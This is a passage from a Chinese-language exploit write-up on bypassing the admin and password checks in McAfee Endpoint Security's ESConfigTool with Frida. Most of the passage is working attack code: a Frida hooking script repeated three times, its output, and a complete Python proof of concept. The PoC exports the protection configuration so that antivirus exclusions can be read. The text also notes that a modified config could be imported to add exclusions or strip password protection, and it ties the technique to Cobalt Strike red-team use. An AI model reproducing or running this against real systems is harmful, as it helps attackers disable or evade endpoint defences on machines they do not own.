### 优化后的文本

#### 0x08 Frida 脚本
本文不会详细介绍如何创建此脚本，因为已经提供了足够的信息。以下是完整的 Frida 脚本：

```javascript
const configBase = Module.findBaseAddress('ESConfigTool.exe');
const adminCheck = configBase.add(0x5f30); // 64位
const BLInvokeMethod = Module.findExportByName('blframework.dll', 'BLInvokeMethod');

console.log('[-] 基地址是:', configBase);
console.log('[-] 管理员检查地址是:', adminCheck);
console.log('[-] BLInvokeMethod 地址是:', BLInvokeMethod);

Interceptor.attach(adminCheck, {
  onEnter: function (args) {
    console.log('[+] 挂载管理员检查函数');
  },
  onLeave: function (retval) {
    console.log('[+] 返回管理员检查为真');
    retval.replace(1);
  }
});

Interceptor.attach(BLInvokeMethod, {
  onEnter: function (args) {
    console.log('[+] 挂载 BLInvokeMethod 函数');
  },
  onLeave: function (retval) {
    console.log('[+] 修补密码检查函数');
    retval.replace(0x0);
  }
});
```

该脚本完成了我们在调试器中手动执行的操作（更改返回值）。接下来，我们将注入上述脚本并查看其效果。

```python
script = """
const configBase = Module.findBaseAddress('ESConfigTool.exe');
const adminCheck = configBase.add(0x5f30); // 64位
const BLInvokeMethod = Module.findExportByName('blframework.dll', 'BLInvokeMethod');

console.log('[-] 基地址是:', configBase);
console.log('[-] 管理员检查地址是:', adminCheck);
console.log('[-] BLInvokeMethod 地址是:', BLInvokeMethod);

Interceptor.attach(adminCheck, {
  onEnter: function (args) {
    console.log('[+] 挂载管理员检查函数');
  },
  onLeave: function (retval) {
    console.log('[+] 返回管理员检查为真');
    retval.replace(1);
  }
});

Interceptor.attach(BLInvokeMethod, {
  onEnter: function (args) {
    console.log('[+] 挂载 BLInvokeMethod 函数');
  },
  onLeave: function (retval) {
    console.log('[+] 修补密码检查函数');
    retval.replace(0x0);
  }
});
"""

session.create_script(script).load()
rdev.resume(pid)
```

输出结果如下：
```
[-] 基地址是: 0x7ff73ed30000
[-] 管理员检查地址是: 0x7ff73ed35f30
[-] BLInvokeMethod 地址是: 0x7ffa4d759730
[+] 挂载管理员检查函数
[+] 返回管理员检查为真
[+] 挂载 BLInvokeMethod 函数
[+] 修补密码检查函数
```

请注意，虽然我是以管理员身份运行的，但并没有绕过 UAC，因此权限与普通用户相同。

#### 0x09 后续步骤
我们终于找到了排除项的内容，并知道了哪些程序是指定排除。由于可以通过 TCP 连接工作，我们可以使用 Cobalt Strike Beacon 在红队任务中完成此任务。

尽管本文仅讨论了导出 McAfee 配置信息，但值得一提的是，你也可以利用此方法导入自己的配置文件。这意味着你可以添加排除项、更改其他设置，甚至删除密码保护。

需要注意的是 `"/plaintext"` 参数，它有时有效，有时无效。可能不同的版本需要不同的功能偏移量，这需要自行研究。即使 McAfee 不提供带此参数的加密配置，你也可以将加密配置导入自己的版本中。

如何配置加密？这个以后再说。在 McAfee PSIRT 解决问题之前，上述方法应该是私密的。

#### 0x10 修复措施
McAfee PSIRT 在 [这里](https://kc.mcafee.com/corporate/index?page=content&id=SB10299) 发布了关于此问题的安全公告及修复程序。实际上我并没有测试过它是否完全修复了，因为我懒。

但是我想到了一件事情：如果他们在 ESConfigTool 中进行了修复，是否可以利用旧版本的工具作用于新版本的 McAfee Endpoint Protection？谁知道呢。如果你想尝试，我已经上传了一个 Python 的 POC 脚本。

```python
#!/usr/bin/env python
import frida

def get_script():
    script = """
const configBase = Module.findBaseAddress('ESConfigTool.exe');
const adminCheck = configBase.add(0x5f30); // 64位
const BLInvokeMethod = Module.findExportByName('blframework.dll', 'BLInvokeMethod')

console.log('[-] 基地址是:', configBase);
console.log('[-] 管理员检查地址是:', adminCheck);
console.log('[-] BLInvokeMethod 地址是:', BLInvokeMethod);

Interceptor.attach(adminCheck, {
  onEnter: function (args) {
    console.log('[+] 挂载管理员检查函数');
  },
  onLeave: function (retval) {
    console.log('[+] 返回管理员检查为真');
    retval.replace(1);
  }
});

Interceptor.attach(BLInvokeMethod, {
  onEnter: function (args) {
    console.log('[+] 挂载 BLInvokeMethod 函数');
  },
  onLeave: function (retval) {
    console.log('[+] 修补密码检查函数');
    retval.replace(0x0);
  }
});
"""
    return script

def main():
    args = [
        'ESConfigTool.exe',
        '/export',
        'c:\\temp\\ESP.xml',
        '/module',
        'TP',
        '/unlock',
        'starwars',
        # 这个参数有时会失败，原因不明
        # '/plaintext'
    ]
    devmgr = frida.get_device_manager()
    devmgr.add_remote_device('127.0.0.1')
    rdev = frida.get_device('tcp@127.0.0.1')
    pid = rdev.spawn(args)
    session = rdev.attach(pid)
    session.create_script(get_script()).load()
    rdev.resume(pid)
    input()

if __name__ == '__main__':
    main()
```

希望这些信息对你有所帮助！